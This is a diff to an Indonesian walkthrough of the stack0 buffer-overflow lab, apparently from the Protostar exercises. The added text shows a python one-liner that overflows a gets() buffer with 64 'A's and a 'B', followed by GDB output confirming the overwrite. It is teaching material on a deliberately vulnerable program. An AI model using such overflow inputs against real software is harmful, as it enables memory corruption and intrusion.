@@ -25,7 +25,7 @@ int main(int argc, char **argv)
 ```
 
 ## Target Exploits
-Pada level ini kita ditargetkan untuk mengubah variabel **modified** menjadi tidak sama dengan 0. Pada program diatas, input kita disimpan pada kedalam buffer menggunakan fungsi gets(). Karena gets() bukanlah fungsi yang aman, kita dapat menggunakannya untuk menimpa memori dimana variabel **modified** disimpan.
+Pada level ini kita ditargetkan untuk mengubah variabel **modified** menjadi tidak sama dengan 0 untuk mencetak string "you have changed the 'modified' variable". Pada program diatas, input kita disimpan pada kedalam buffer menggunakan fungsi gets(). Karena gets() bukanlah fungsi yang aman, kita dapat menggunakannya untuk menimpa memori dimana variabel **modified** disimpan.
 
 ## Kerentanan Program
 Seperti yang dikatakan sebelumnya **gets()** adalah fungsi yang tidak aman. Jika kita melihat pada man pages gets() dengan mengetikkan *man gets* pada bagian BUGS disebutkan bahwa gets() rentan karena tidak mungkin untuk mengetahui berapa banyak karakter yang akan diterima oleh gets(). fungsi ini akan terus menyimpan karakter setelah akhir buffer.
@@ -99,5 +99,28 @@ Kita dapat menggunakan python untuk menghasilkan 64 karakter tersebut
 python -c "print ('A'*64)" | ./stack0
 Try again?
 ```
+
+Mengapa tidak berhasil mencetak string **you have changed the 'modified' variable**?? </br>
+Itu karena modified variabel belum terganti, masih = 0. Kita bisa mencoba menambahkan satu karakter untuk menimpa variabel itu
+
+```
+python -c "print ('A'*64+'B')" | ./stack0
+you have changed the 'modified' variable
+
+```
+
+Nah.. Sekarang coba kita lihat apa yang terjadi di GDB
+
+```
+b *0x08048415 </br>
+run </br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB </br>
+x/wx $esp+0x5c
+0xffffcdec:	0x00000042
+x/wx $esp+0x1c
+0xffffcdac:	0x41414141
+```
+
+Dapat dilihat sekarang alamat modified variabel kita sudah terganti dengan 0x00000042, 0x42 adalah "**B**" dalam Hexadesimal
 
 
